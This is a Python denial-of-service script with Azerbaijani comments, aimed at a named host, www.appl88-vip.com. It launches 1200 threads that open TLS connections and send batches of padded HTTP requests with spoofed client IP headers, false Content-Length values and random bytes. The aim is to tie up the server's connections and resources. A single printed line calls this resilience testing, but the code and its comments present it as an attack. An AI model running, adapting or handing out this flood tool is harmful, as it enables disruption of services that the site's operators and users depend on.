import socket
import ssl
import threading
import random
import time
import os

# --- EXTREME TARGET ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1200 # Maksimal şəbəkə sıxlığı
BATCH_SIZE = 500 # Bir bağlantıdan gələn sarsıdıcı dalğa

def get_malformed_h2_headers():
    """HTTP/2 darvazasını aldatmaq üçün pozulmuş və ağır başlıq yaradır"""
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    junk = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=200))
    
    # Bu başlıqlar serveri daxildən sarsıtmaq üçün mürəkkəb kombinasiyadadır
    headers = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        f"X-Forwarded-For: {fake_ip}\r\n"
        f"X-Real-IP: {fake_ip}\r\n"
        f"X-Forwarded-Proto: https\r\n"
        f"X-Frame-Options: {junk}\r\n" # Ağır header
        f"Upgrade-Insecure-Requests: 1\r\n"
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Connection: Keep-Alive\r\n"
        f"Keep-Alive: timeout=600, max=1000\r\n"
        f"Content-Length: {random.randint(2000, 5000)}\r\n"
        f"\r\n"
    ).encode()
    return headers

def black_hole_attack():
    # SSL tənzimləmələrini serveri yormaq üçün edirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ALL:@SECLEVEL=0') # Ən aşağı təhlükəsizlik səviyyəsi ilə serveri yorur

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle alqoritmini bypass et (Anında zərbə)
            sock.settimeout(5)

            conn = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # BATCH STRIKE: Serveri bir saniyədə yüzlərlə yarımçıq paketlə boğmaq
            for _ in range(BATCH_SIZE):
                conn.sendall(get_malformed_h2_headers())
                # Serverə saxta, bitməyən data göndərərək onun bağlantısını dondurmaq
                conn.send(os.urandom(10)) 
                
            # Bağlantını bağlamırıq, timeout olana qədər serverin resursunu kilitləyirik
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"💀 BLACK HOLE PROTOCOL INITIALIZED: {TARGET_HOST}")
    print("[!] Warning: Testing high-load resilience on Target infrastructure.")
    
    for i in range(THREADS):
        t = threading.Thread(target=black_hole_attack)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Heavy Warheads Launched...")
            time.sleep(0.5)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
